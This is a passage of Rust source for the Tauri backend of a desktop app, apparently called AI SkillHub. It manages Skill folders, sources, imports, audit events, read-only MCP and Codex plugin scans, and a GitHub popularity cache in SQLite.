            "INSERT INTO skill_folders
                (id, name, note, color, sort_order, created_at, updated_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?6)",
            params![id, name, note, color, sort_order, timestamp],
        )
        .map_err(|error| {
            if error.to_string().contains("UNIQUE") {
                "已经有同名文件夹。".to_string()
            } else {
                format!("Cannot create Skill folder: {}", error)
            }
        })?;
    write_audit_event(
        &connection,
        "skill_folder_created",
        "Created local Skill folder",
        serde_json::json!({ "folderId": id, "name": name, "scope": "sqlite-only" }),
    )?;
    read_indexed_skill_folders(&connection)
}

#[tauri::command]
fn update_skill_folder(
    folder_id: String,
    name: String,
    note: String,
    color: String,
) -> Result<Vec<SkillFolderCard>, String> {
    let folder_id = compact_note(&folder_id);
    let (name, note, color) = validate_skill_folder_fields(&name, &note, &color)?;
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let changed = connection
        .execute(
            "UPDATE skill_folders
             SET name = ?1, note = ?2, color = ?3, updated_at = ?4
             WHERE id = ?5",
            params![name, note, color, unix_timestamp_string(), folder_id],
        )
        .map_err(|error| {
            if error.to_string().contains("UNIQUE") {
                "已经有同名文件夹。".to_string()
            } else {
                format!("Cannot update Skill folder: {}", error)
            }
        })?;
    if changed == 0 {
        return Err("找不到要编辑的 Skill 文件夹。".to_string());
    }
    write_audit_event(
        &connection,
        "skill_folder_updated",
        "Updated local Skill folder",
        serde_json::json!({ "folderId": folder_id, "name": name, "scope": "sqlite-only" }),
    )?;
    read_indexed_skill_folders(&connection)
}

#[tauri::command]
fn delete_skill_folder(folder_id: String) -> Result<Vec<SkillFolderCard>, String> {
    let folder_id = compact_note(&folder_id);
    let root = resolve_legacy_root()?;
    let mut connection = open_index_database(&root)?;
    let transaction = connection
        .transaction()
        .map_err(|error| format!("Cannot start Skill folder deletion: {}", error))?;
    transaction
        .execute(
            "DELETE FROM skill_folder_memberships WHERE folder_id = ?1",
            params![folder_id],
        )
        .map_err(|error| format!("Cannot unfile Skills: {}", error))?;
    transaction
        .execute(
            "DELETE FROM source_folder_memberships WHERE folder_id = ?1",
            params![folder_id],
        )
        .map_err(|error| format!("Cannot unfile source trees: {}", error))?;
    let changed = transaction
        .execute(
            "DELETE FROM skill_folders WHERE id = ?1",
            params![folder_id],
        )
        .map_err(|error| format!("Cannot delete Skill folder: {}", error))?;
    if changed == 0 {
        return Err("找不到要删除的 Skill 文件夹。".to_string());
    }
    transaction
        .commit()
        .map_err(|error| format!("Cannot commit Skill folder deletion: {}", error))?;
    write_audit_event(
        &connection,
        "skill_folder_deleted",
        "Deleted local Skill folder; Skills were kept",
        serde_json::json!({ "folderId": folder_id, "skillsDeleted": 0, "scope": "sqlite-only" }),
    )?;
    read_indexed_skill_folders(&connection)
}

fn require_skill_folder(connection: &Connection, folder_id: &str) -> Result<(), String> {
    let exists: Option<String> = connection
        .query_row(
            "SELECT id FROM skill_folders WHERE id = ?1 LIMIT 1",
            params![folder_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate Skill folder: {}", error))?;
    exists
        .map(|_| ())
        .ok_or_else(|| "选择的 Skill 文件夹不存在。".to_string())
}

#[tauri::command]
fn move_skill_to_folder(
    skill_id: String,
    folder_id: String,
) -> Result<Vec<SkillFolderCard>, String> {
    let skill_id = compact_note(&skill_id);
    let folder_id = compact_note(&folder_id);
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let skill_source_id: Option<Option<String>> = connection
        .query_row(
            "SELECT source_id FROM skills WHERE id = ?1 LIMIT 1",
            params![skill_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate Skill: {}", error))?;
    let skill_source_id = skill_source_id
        .ok_or_else(|| "找不到要归档的 Skill。".to_string())?
        .unwrap_or_default();
    if !skill_source_id.is_empty() {
        update_source_folder_membership(&connection, &skill_source_id, &folder_id)?;
        write_audit_event(
            &connection,
            "source_tree_folder_updated",
            "Moved the full source tree because a child Skill was selected",
            serde_json::json!({ "sourceId": skill_source_id, "skillId": skill_id, "folderId": folder_id, "scope": "sqlite-only" }),
        )?;
        return read_indexed_skill_folders(&connection);
    }
    if folder_id.is_empty() {
        connection
            .execute(
                "DELETE FROM skill_folder_memberships WHERE skill_id = ?1",
                params![skill_id],
            )
            .map_err(|error| format!("Cannot remove Skill from folder: {}", error))?;
    } else {
        require_skill_folder(&connection, &folder_id)?;
        let timestamp = unix_timestamp_string();
        connection
            .execute(
                "INSERT INTO skill_folder_memberships (skill_id, folder_id, sort_order, updated_at)
                 VALUES (?1, ?2, 0, ?3)
                 ON CONFLICT(skill_id) DO UPDATE SET
                    folder_id = excluded.folder_id,
                    updated_at = excluded.updated_at",
                params![skill_id, folder_id, timestamp],
            )
            .map_err(|error| format!("Cannot move Skill into folder: {}", error))?;
    }
    write_audit_event(
        &connection,
        "skill_folder_membership_updated",
        "Moved Skill between local folders",
        serde_json::json!({ "skillId": skill_id, "folderId": folder_id, "scope": "sqlite-only" }),
    )?;
    read_indexed_skill_folders(&connection)
}

#[tauri::command]
fn move_source_skills_to_folder(
    source_id: String,
    folder_id: String,
) -> Result<Vec<SkillFolderCard>, String> {
    let source_id = compact_note(&source_id);
    let folder_id = compact_note(&folder_id);
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let source_exists: Option<String> = connection
        .query_row(
            "SELECT id FROM sources WHERE id = ?1 LIMIT 1",
            params![source_id],
            |row| row.get(0),
        )
        .optional()
        .map_err(|error| format!("Cannot locate source tree: {}", error))?;
    source_exists.ok_or_else(|| "找不到要归档的父 Skill 来源。".to_string())?;
    let changed = update_source_folder_membership(&connection, &source_id, &folder_id)?;
    write_audit_event(
        &connection,
        "source_skills_folder_updated",
        "Filed every Skill from one source",
        serde_json::json!({ "sourceId": source_id, "folderId": folder_id, "changed": changed, "scope": "sqlite-only" }),
    )?;
    read_indexed_skill_folders(&connection)
}

fn update_source_folder_membership(
    connection: &Connection,
    source_id: &str,
    folder_id: &str,
) -> Result<usize, String> {
    if !folder_id.is_empty() {
        require_skill_folder(connection, folder_id)?;
    }
    let timestamp = unix_timestamp_string();
    let changed = if folder_id.is_empty() {
        connection
            .execute(
                "DELETE FROM source_folder_memberships WHERE source_id = ?1",
                params![source_id],
            )
            .map_err(|error| format!("Cannot unfile source tree: {}", error))?
    } else {
        connection
            .execute(
                "INSERT INTO source_folder_memberships (source_id, folder_id, sort_order, updated_at)
                 VALUES (?1, ?2, 0, ?3)
                 ON CONFLICT(source_id) DO UPDATE SET
                    folder_id = excluded.folder_id,
                    updated_at = excluded.updated_at",
                params![source_id, folder_id, timestamp],
            )
            .map_err(|error| format!("Cannot file source tree: {}", error))?
    };
    connection
        .execute(
            "DELETE FROM skill_folder_memberships
             WHERE skill_id IN (SELECT id FROM skills WHERE source_id = ?1)",
            params![source_id],
        )
        .map_err(|error| format!("Cannot clear legacy child folder assignments: {}", error))?;
    Ok(changed)
}

#[tauri::command]
fn move_skill_folder(folder_id: String, direction: String) -> Result<Vec<SkillFolderCard>, String> {
    let folder_id = compact_note(&folder_id);
    let direction = direction.trim();
    if direction != "up" && direction != "down" {
        return Err("Unsupported Skill folder direction.".to_string());
    }
    let root = resolve_legacy_root()?;
    let mut connection = open_index_database(&root)?;
    let folders = read_indexed_skill_folders(&connection)?;
    let current = folders
        .iter()
        .position(|folder| folder.id == folder_id)
        .ok_or_else(|| "找不到要排序的 Skill 文件夹。".to_string())?;
    let neighbor = if direction == "up" {
        current.checked_sub(1)
    } else if current + 1 < folders.len() {
        Some(current + 1)
    } else {
        None
    };
    let Some(neighbor) = neighbor else {
        return Ok(folders);
    };
    let transaction = connection
        .transaction()
        .map_err(|error| format!("Cannot start Skill folder reorder: {}", error))?;
    let timestamp = unix_timestamp_string();
    transaction
        .execute(
            "UPDATE skill_folders SET sort_order = ?1, updated_at = ?2 WHERE id = ?3",
            params![folders[neighbor].sort_order, timestamp, folders[current].id],
        )
        .map_err(|error| format!("Cannot reorder Skill folder: {}", error))?;
    transaction
        .execute(
            "UPDATE skill_folders SET sort_order = ?1, updated_at = ?2 WHERE id = ?3",
            params![folders[current].sort_order, timestamp, folders[neighbor].id],
        )
        .map_err(|error| format!("Cannot reorder Skill folder: {}", error))?;
    transaction
        .commit()
        .map_err(|error| format!("Cannot commit Skill folder reorder: {}", error))?;
    read_indexed_skill_folders(&connection)
}

#[tauri::command]
fn set_source_metadata(
    source_id: String,
    name: String,
    source_type: String,
    category: String,
    note: String,
    enabled: bool,
) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let previous_enabled = read_indexed_sources(&connection)?
        .into_iter()
        .find(|source| source.id == source_id)
        .map(|source| source.enabled);
    set_source_metadata_override_in_connection(
        &connection,
        &source_id,
        &name,
        &source_type,
        &category,
        &note,
        enabled,
    )?;
    if previous_enabled != Some(enabled) {
        sync_local_sources_to_agents(&root, &connection)?;
        return scan_legacy_snapshot_blocking();
    }
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_sources_bulk_metadata(
    source_ids: Vec<String>,
    category: String,
    enabled: Option<bool>,
) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_sources_bulk_metadata_in_connection(&connection, &source_ids, &category, enabled)?;
    if enabled.is_some() {
        sync_local_sources_to_agents(&root, &connection)?;
        return scan_legacy_snapshot_blocking();
    }
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_skill_tags(folder_name: String, tags: Vec<String>) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_skill_tags_in_connection(&connection, &folder_name, &tags)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_source_tags(source_id: String, tags: Vec<String>) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_source_tags_in_connection(&connection, &source_id, &tags)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn delete_managed_source(source_id: String) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    if !database_file(&root).exists() {
        let _ = scan_legacy_snapshot_blocking()?;
    }
    let connection = open_index_database(&root)?;
    let sources = read_indexed_sources(&connection)?;
    let source = sources
        .iter()
        .find(|source| source.id == source_id)
        .cloned()
        .ok_or_else(|| format!("Cannot find indexed source {}.", source_id))?;
    let source_path = validate_managed_source_delete_path(&root, &source)?;
    let mut backup_path = None;
    let removed_folder = if source_path.exists() {
        let destination = deleted_source_backup_path(&root, &source)?;
        fs::rename(&source_path, &destination).map_err(|error| {
            format!(
                "Cannot move source folder {} into the recoverable backup area: {}",
                source_path.display(),
                error
            )
        })?;
        backup_path = Some(destination);
        true
    } else {
        false
    };
    let config_pruned = remove_source_from_runtime_config(&root, &source)?;
    cleanup_deleted_source_sqlite_state(&connection, &source.id)?;
    source_governance::remove_source_state(&root, &connection, &source.id)?;
    write_audit_event(
        &connection,
        "source_deleted",
        &format!(
            "Moved managed source {} to a recoverable backup",
            source.name
        ),
        serde_json::json!({
            "sourceId": source.id,
            "sourceName": source.name,
            "path": source_path.display().to_string(),
            "removedFolder": removed_folder,
            "recoverable": backup_path.is_some(),
            "backupPath": backup_path
                .as_ref()
                .map(|path| path.display().to_string())
                .unwrap_or_default(),
            "configPruned": config_pruned,
        }),
    )?;

    sync_local_sources_to_agents(&root, &connection)?;
    scan_legacy_snapshot_blocking()
}

#[tauri::command]
fn set_preset_workspace_enabled(
    preset_id: String,
    workspace_id: String,
    enabled: bool,
) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_preset_workspace_enabled_in_connection(&connection, &preset_id, &workspace_id, enabled)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_real_write_authorization(enabled: bool) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_real_write_authorization_in_connection(&connection, enabled)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn run_release_gate_runner(runner_id: String) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    run_release_gate_runner_in_connection(&root, &connection, &runner_id)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn open_release_gate_export_path(path: String) -> Result<(), String> {
    let root = resolve_legacy_root()?;
    let target = validate_release_gate_export_path(&root, &path)?;
    open_path_with_system(&target)
}

/// Inventory only: this command never starts an MCP server and never accepts
/// arbitrary paths from the webview. Home and workspace roots are resolved in
/// Rust from the current user and AI SkillHub's registered SQLite workspaces.
#[tauri::command]
async fn scan_mcp_connections() -> Result<mcp_center::McpInventory, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let home_dir = std::env::var_os("USERPROFILE")
            .or_else(|| std::env::var_os("HOME"))
            .map(PathBuf::from)
            .filter(|path| path.is_absolute())
            .ok_or_else(|| "无法确定当前用户目录；MCP 只读扫描未运行。".to_string())?;

        let root = resolve_legacy_root()?;
        let db_file = database_file(&root);
        let workspaces = if db_file.is_file() {
            let connection = Connection::open_with_flags(
                &db_file,
                rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY
                    | rusqlite::OpenFlags::SQLITE_OPEN_NO_MUTEX,
            )
            .map_err(|_| "无法以只读方式打开 AI SkillHub 工作区索引。".to_string())?;
            read_indexed_workspaces(&connection)?
        } else {
            Vec::new()
        };
        let registered_workspaces = workspaces
            .into_iter()
            .filter(|workspace| workspace.enabled && workspace.scope != "global")
            .filter_map(|workspace| {
                let path = PathBuf::from(workspace.path);
                path.is_absolute()
                    .then_some(mcp_center::RegisteredWorkspace {
                        id: workspace.id,
                        display_name: workspace.name,
                        path,
                    })
            })
            .collect();

        Ok(mcp_center::scan_connections(mcp_center::McpScanRequest {
            home_dir,
            registered_workspaces,
            registered_codex_profiles: Vec::new(),
            platform: Some(std::env::consts::OS.to_string()),
        }))
    })
    .await
    .map_err(|_| "MCP 只读扫描后台任务意外停止；没有修改任何配置。".to_string())?
}

/// Strictly read-only. The probe does not execute Codex, PowerShell, npm,
/// setup.ps1, cached JavaScript, or the standalone desktop repair utility.
#[tauri::command]
async fn scan_codex_plugin_doctor() -> Result<codex_plugin_doctor::CodexPluginDoctorReport, String>
{
    tauri::async_runtime::spawn_blocking(codex_plugin_doctor::scan_default)
        .await
        .map_err(|_| "Codex 插件只读检查后台任务意外停止；没有执行任何修复。".to_string())
}

fn validate_release_gate_export_path(root: &Path, path: &str) -> Result<PathBuf, String> {
    let trimmed = path.trim();
    if trimmed.is_empty() {
        return Err("没有可打开的导出路径。".to_string());
    }

    let reports_root = private_state_dir(root).join("reports");
    if !reports_root.exists() {
        return Err("还没有生成 AI SkillHub 报告，请先运行 Release Gate 执行器。".to_string());
    }

    let canonical_reports_root = reports_root
        .canonicalize()
        .map_err(|error| format!("无法读取 AI SkillHub 报告目录：{error}"))?;
    let requested_path = PathBuf::from(trimmed);
    let canonical_target = requested_path
        .canonicalize()
        .map_err(|error| format!("无法读取导出路径：{error}"))?;

    if !canonical_target.starts_with(&canonical_reports_root) {
        return Err("只能打开 AI SkillHub 自己生成的报告导出路径。".to_string());
    }

    Ok(canonical_target)
}

fn open_path_with_system(path: &Path) -> Result<(), String> {
    #[cfg(target_os = "windows")]
    {
        let result = if path.is_file() {
            std::process::Command::new("explorer.exe")
                .arg(format!("/select,{}", path.display()))
                .spawn()
        } else {
            std::process::Command::new("explorer.exe").arg(path).spawn()
        };
        result
            .map(|_| ())
            .map_err(|error| format!("打开资源管理器失败：{error}"))
    }

    #[cfg(target_os = "macos")]
    {
        std::process::Command::new("open")
            .arg(path)
            .spawn()
            .map(|_| ())
            .map_err(|error| format!("打开 Finder 失败：{error}"))
    }

    #[cfg(all(unix, not(target_os = "macos")))]
    {
        std::process::Command::new("xdg-open")
            .arg(path)
            .spawn()
            .map(|_| ())
            .map_err(|error| format!("打开文件管理器失败：{error}"))
    }
}

#[tauri::command]
async fn preview_source_import_candidate(
    import_kind: String,
    input: String,
) -> Result<SourceImportPlanCard, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let root = resolve_legacy_root()?;
        let connection = open_index_database(&root)?;
        build_source_import_plan(&root, &connection, &import_kind, &input)
    })
    .await
    .map_err(|error| format!("Source import preview worker stopped: {error}"))?
}

#[tauri::command]
async fn stage_source_import_candidate(
    app: tauri::AppHandle,
    operation_id: Option<String>,
    import_kind: String,
    input: String,
) -> Result<SourceImportExecutionCard, String> {
    let operation_id = normalize_source_import_operation_id(operation_id.as_deref())?;
    let cancellation = Arc::new(AtomicBool::new(false));
    {
        let mut cancellations = SOURCE_IMPORT_CANCELLATIONS
            .get_or_init(|| Mutex::new(HashMap::new()))
            .lock()
            .map_err(|_| "暂时无法启动导入任务，请重试。".to_string())?;
        if cancellations.contains_key(&operation_id) {
            return Err("同一个导入任务仍在运行，请等待完成或先取消。".to_string());
        }
        cancellations.insert(operation_id.clone(), Arc::clone(&cancellation));
    }
    let operation_id_for_worker = operation_id.clone();
    let result = tauri::async_runtime::spawn_blocking(move || {
        let root = resolve_legacy_root()?;
        let connection = open_index_database(&root)?;
        let control = SourceImportControl::with_app(operation_id_for_worker, cancellation, app);
        stage_source_import_candidate_in_connection_with_control(
            &root,
            &connection,
            &import_kind,
            &input,
            &control,
        )
    })
    .await
    .map_err(|_| "导入后台任务意外停止；正式技能库没有改变。".to_string());
    if let Ok(mut cancellations) = SOURCE_IMPORT_CANCELLATIONS
        .get_or_init(|| Mutex::new(HashMap::new()))
        .lock()
    {
        cancellations.remove(&operation_id);
    }
    result?
}

#[tauri::command]
fn cancel_source_import(operation_id: String) -> Result<bool, String> {
    let operation_id = normalize_source_import_operation_id(Some(&operation_id))?;
    let cancellations = SOURCE_IMPORT_CANCELLATIONS
        .get_or_init(|| Mutex::new(HashMap::new()))
        .lock()
        .map_err(|_| "暂时无法取消导入任务，请重试。".to_string())?;
    let Some(cancellation) = cancellations.get(&operation_id) else {
        return Ok(false);
    };
    cancellation.store(true, Ordering::SeqCst);
    Ok(true)
}

#[tauri::command]
fn load_prompt_invocation(
    source_id: String,
) -> Result<prompt_library::PromptInvocationCard, String> {
    let normalized_source_id = compact_note(&source_id);
    if normalized_source_id.is_empty() {
        return Err("请先选择一个 Prompt 来源。".to_string());
    }
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let source = read_prompt_source_record(&connection, &normalized_source_id)?;

    let mut statement = connection
        .prepare(
            r#"
            SELECT id, name, detected, managed, enabled
            FROM agent_adapters
            WHERE lower(id) IN ('codex', 'claude')
            ORDER BY CASE lower(id) WHEN 'codex' THEN 0 ELSE 1 END
            "#,
        )
        .map_err(|error| format!("无法读取 Codex / Claude 状态：{}", error))?;
    let hosts = statement
        .query_map([], |row| {
            Ok(prompt_library::PromptHostStatus {
                id: row.get(0)?,
                name: row.get(1)?,
                detected: row.get::<_, i64>(2)? != 0,
                managed: row.get::<_, i64>(3)? != 0,
                enabled: row.get::<_, i64>(4)? != 0,
            })
        })
        .map_err(|error| format!("无法读取 Codex / Claude 状态：{}", error))?
        .filter_map(Result::ok)
        .collect::<Vec<_>>();

    prompt_library::build_prompt_invocation(&managed_sources_dir(&root), source, hosts)
}

fn read_prompt_source_record(
    connection: &Connection,
    source_id: &str,
) -> Result<prompt_library::PromptSourceRecord, String> {
    connection
        .query_row(
            r#"
            SELECT sources.id,
                   COALESCE(NULLIF(source_overrides.display_name, ''), sources.name),
                   COALESCE(NULLIF(source_overrides.source_type, ''), sources.source_type),
                   COALESCE(sources.url, ''),
                   COALESCE(sources.local_path, '')
            FROM sources
            LEFT JOIN source_overrides ON source_overrides.source_id = sources.id
            WHERE sources.id = ?1
            "#,
            params![source_id],
            |row| {
                Ok(prompt_library::PromptSourceRecord {
                    id: row.get(0)?,
                    name: row.get(1)?,
                    source_type: row.get(2)?,
                    url: row.get(3)?,
                    local_path: row.get(4)?,
                })
            },
        )
        .optional()
        .map_err(|error| format!("无法读取 Prompt 来源索引：{}", error))?
        .ok_or_else(|| "未找到该 Prompt 来源；请先刷新技能库。".to_string())
}

#[tauri::command]
fn open_prompt_source_folder(source_id: String) -> Result<(), String> {
    let normalized_source_id = compact_note(&source_id);
    if normalized_source_id.is_empty() {
        return Err("请先选择一个 Prompt 来源。".to_string());
    }
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let source = read_prompt_source_record(&connection, &normalized_source_id)?;
    let source_path =
        prompt_library::managed_prompt_source_path(&managed_sources_dir(&root), &source)?;
    open_path_with_system(&source_path)
}

#[tauri::command]
async fn promote_staged_source_import(
    import_kind: String,
    staged_path: String,
    source_name: String,
    security_review_confirmed: bool,
) -> Result<SourceImportPromotionCard, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let root = resolve_legacy_root()?;
        let connection = open_index_database(&root)?;
        let mut promotion = promote_staged_source_import_in_connection(
            &root,
            &connection,
            &import_kind,
            &staged_path,
            &source_name,
            security_review_confirmed,
        )?;
        if promotion.status == "promoted" || promotion.status == "already-managed" {
            let reviewed_local_only = promotion.security_review_confirmed
                && promotion.security_status != "passed";
            if reviewed_local_only {
                let indexed = scan_legacy_snapshot_blocking()?;
                let source = indexed
                    .sources
                    .iter()
                    .find(|source| {
                        normalize_path_for_compare(&source.local_path)
                            == normalize_path_for_compare(&promotion.target_path)
                    })
                    .ok_or_else(|| {
                        "复核来源已复制，但本地索引未能定位它；为避免后续误同步，导入保持未完成。"
                            .to_string()
                    })?;
                set_source_metadata_override_in_connection(
                    &connection,
                    &source.id,
                    &source.name,
                    &source.source_type,
                    &source.category_id,
                    &source.note,
                    false,
                )?;
                promotion.summary = format!(
                    "{} 已刷新本地索引并强制保持停用；未同步到 Codex、Claude 或其它 AI 工具。",
                    promotion.summary
                );
                promotion.real_write_scope =
                    "app-next/data/github_sources + sqlite-index (disabled)".to_string();
                return write_source_import_promotion_report(
                    &root,
                    &connection,
                    promotion,
                    &unix_timestamp_string(),
                );
            }
            match sync_local_sources_to_agents(&root, &connection) {
                Ok(()) => {
                    promotion.summary = format!(
                        "{} 已刷新共享 Skills、父/子 Skill 路由和 Agent 托管链接。",
                        promotion.summary
                    );
                    promotion.real_write_scope =
                        "app-next/data/github_sources + skills + agent-links".to_string();
                    promotion.blocking_checks.retain(|check| {
                        !check.contains("不写入 skills")
                            && !check.contains("如已开启真实写入授权")
                            && !check.contains("AI 工具链接")
                    });
                    promotion.blocking_checks.push(
                        "已执行本地扫描同步：共享 Skills、父子路由、Claude/Codex/Antigravity 链接已刷新。"
                            .to_string(),
                    );
                }
                Err(error) => {
                    promotion.summary = format!(
                        "{} 来源已添加，但 Agent 链接同步未完成：{}",
                        promotion.summary, error
                    );
                    promotion.blocking_checks.push(format!(
                        "Agent 链接同步未完成：{}。可稍后点击同步 / 刷新重试。",
                        error
                    ));
                }
            }
            return write_source_import_promotion_report(
                &root,
                &connection,
                promotion,
                &unix_timestamp_string(),
            );
        }
        Ok(promotion)
    })
    .await
    .map_err(|error| format!("Source import promotion worker stopped: {error}"))?
}

#[tauri::command]
fn record_usage_event(
    target_type: String,
    target_id: String,
    target_name: String,
    source_name: String,
    event_type: String,
) -> Result<LegacySnapshot, String> {
    record_usage_event_row(
        &target_type,
        &target_id,
        &target_name,
        &source_name,
        &event_type,
    )?;
    load_indexed_snapshot_blocking()
}

fn refresh_source_popularity_blocking() -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let mut sources = read_indexed_sources(&connection)?;
    hydrate_source_urls_from_git(&root, &mut sources);
    let fetched_at = unix_timestamp_string();
    let fetched_at_nanos = fetched_at.parse::<u128>().unwrap_or_default();
    let mut refreshed = 0usize;
    let mut deferred = 0usize;
    let mut failed = 0usize;
    let mut skipped_recent = 0usize;
    let mut batch_deferred_reason: Option<String> = None;

    for source in sources {
        let Some((owner, repo)) = parse_github_repo(&source.url) else {
            continue;
        };

        if source_popularity_cache_is_recent(&connection, &source.id, fetched_at_nanos)? {
            skipped_recent += 1;
            continue;
        }

        if let Some(reason) = batch_deferred_reason.as_deref() {
            let fallback = GithubPopularityFetch {
                created_at: String::new(),
                stars: 0,
                forks: 0,
                open_issues: 0,
                last_updated_at: String::new(),
            };
            upsert_source_popularity_cache(
                &connection,
                &source,
                &owner,
                &repo,
                &fallback,
                &fetched_at,
                "deferred",
                reason,
            )?;
            deferred += 1;
            continue;
        }

        match fetch_github_popularity(&owner, &repo) {
            Ok(popularity) => {
                upsert_source_popularity_cache(
                    &connection,
                    &source,
                    &owner,
                    &repo,
                    &popularity,
                    &fetched_at,
                    "fresh",
                    "",
                )?;
                refreshed += 1;
            }
            Err(error) => {
                let cache_status = source_popularity_cache_status_for_error(&error);
                let fallback = GithubPopularityFetch {
                    created_at: String::new(),
                    stars: 0,
                    forks: 0,
                    open_issues: 0,
                    last_updated_at: String::new(),
                };
                upsert_source_popularity_cache(
                    &connection,
                    &source,
                    &owner,
                    &repo,
                    &fallback,
                    &fetched_at,
                    cache_status,
                    &error,
                )?;
                if cache_status == "error" {
                    failed += 1;
                } else {
                    deferred += 1;
                    if source_popularity_error_should_pause_batch(&error) {
                        batch_deferred_reason = Some(format!(
                            "Skipped this refresh after GitHub deferred an earlier request: {}",
                            compact_note(&error)
                        ));
                    }
                }
            }
        }
    }

    connection
        .execute(
            "INSERT INTO audit_events (
                id, event_type, summary, detail_json, created_at
            ) VALUES (?1, 'source_popularity_refreshed', ?2, ?3, ?4)",
            params![
                format!("audit-source-popularity-{}", fetched_at),
                format!(
                    "GitHub popularity cache refreshed: {} ok, {} deferred, {} failed.",
                    refreshed, deferred, failed
                ),
                serde_json::to_string(&serde_json::json!({
                    "refreshed": refreshed,
                    "deferred": deferred,
                    "failed": failed,
                    "skippedRecent": skipped_recent,
                    "scope": "github-api-cache"
                }))
                .unwrap_or_else(|_| "{}".to_string()),
                fetched_at
            ],
        )
        .map_err(|error| format!("Cannot write source popularity audit event: {}", error))?;

    scan_legacy_snapshot_blocking()
}

fn resolve_legacy_root() -> Result<PathBuf, String> {
    if let Ok(value) = std::env::var("AI_SKILLHUB_ROOT") {
        let root = PathBuf::from(value);
        if is_skillhub_root(&root) {
            prepare_user_data(&root)?;
            return Ok(root);
        }

        return Err(format!(
            "AI_SKILLHUB_ROOT does not point to an AI SkillHub project folder: {}",
            root.display()
        ));
    }

    if let Ok(exe) = std::env::current_exe() {
        if let Some(parent) = exe.parent() {
            if let Some(root) = find_skillhub_root_from(parent) {
                prepare_user_data(&root)?;
                return Ok(root);
            }
        }
    }

    if let Ok(current_dir) = std::env::current_dir() {
        if let Some(root) = find_skillhub_root_from(&current_dir) {
            prepare_user_data(&root)?;
            return Ok(root);
        }
    }

    Err(
        "Cannot resolve AI SkillHub root. Put AI SkillHub.exe inside the AI SkillHub project folder or set AI_SKILLHUB_ROOT."
            .to_string(),
    )
}

fn find_skillhub_root_from(start: &Path) -> Option<PathBuf> {
    start
        .ancestors()
        .find(|candidate| is_skillhub_root(candidate))
        .map(PathBuf::from)
}

fn is_skillhub_root(root: &Path) -> bool {
    skillhub_script_file(root).is_file() && agent_link_script_file(root).is_file()
}

fn read_json(path: &Path) -> Option<Value> {
    let raw = fs::read_to_string(path).ok()?;
    serde_json::from_str(raw.trim_start_matches('\u{feff}')).ok()
}

fn app_next_root(root: &Path) -> PathBuf {
    root.join("app-next")
}

fn app_next_runtime_root(root: &Path) -> PathBuf {
    app_next_root(root).join("runtime")
}

fn user_data_root(root: &Path) -> PathBuf {
    if cfg!(test) {
        return app_next_root(root).join(".skillhub-next");
    }
    if let Ok(value) = std::env::var("AI_SKILLHUB_DATA_ROOT") {
        let value = value.trim();
        if !value.is_empty() {
            return PathBuf::from(value);
        }
    }
    if let Ok(local_app_data) = std::env::var("LOCALAPPDATA") {
        let local_app_data = local_app_data.trim();
        if !local_app_data.is_empty() {
            return PathBuf::from(local_app_data)
                .join("AI SkillHub")
                .join("UserData");
        }
    }
    app_next_root(root)
        .join(".skillhub-next")
        .join("user-data-v3")
}

fn private_state_dir(root: &Path) -> PathBuf {
    if cfg!(test) {
        app_next_root(root).join(".skillhub-next")
    } else {
        user_data_root(root).join("state")
    }
}

fn active_skills_dir(root: &Path) -> PathBuf {
    if cfg!(test) {
        root.join("skills")
    } else {
        user_data_root(root).join("skills")
    }
}

fn managed_sources_dir(root: &Path) -> PathBuf {
    if cfg!(test) {
        app_next_root(root).join("data").join("github_sources")
    } else {
        user_data_root(root).join("sources")
    }
}

fn active_sources_dir(root: &Path) -> PathBuf {
    managed_sources_dir(root)
}

fn reports_dir(root: &Path) -> PathBuf {
    if cfg!(test) {
        app_next_root(root).join("reports")
    } else {
        user_data_root(root).join("reports")
    }
}

fn diagnostics_file(root: &Path) -> PathBuf {
    reports_dir(root).join("latest-diagnostics.json")
}

fn read_last_sync_summary(root: &Path) -> SyncSummaryCard {
    let path = reports_dir(root).join("last-sync.json");
    let Ok(raw) = fs::read_to_string(path) else {
        return SyncSummaryCard::default();
    };
    let Ok(payload) = serde_json::from_str::<Value>(&raw) else {
        return SyncSummaryCard::default();
    };
    let usize_field = |key: &str| payload.get(key).and_then(Value::as_u64).unwrap_or(0) as usize;
    let repositories = payload
        .get("repositories")
        .and_then(Value::as_array)
        .map(|items| {
            items
                .iter()
                .map(|item| SyncRepositoryCard {
                    repository: item
                        .get("Repository")
                        .or_else(|| item.get("repository"))
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string(),
                    action: item
                        .get("Action")
                        .or_else(|| item.get("action"))
                        .and_then(Value::as_str)
                        .unwrap_or_default()
                        .to_string(),
                    status: item
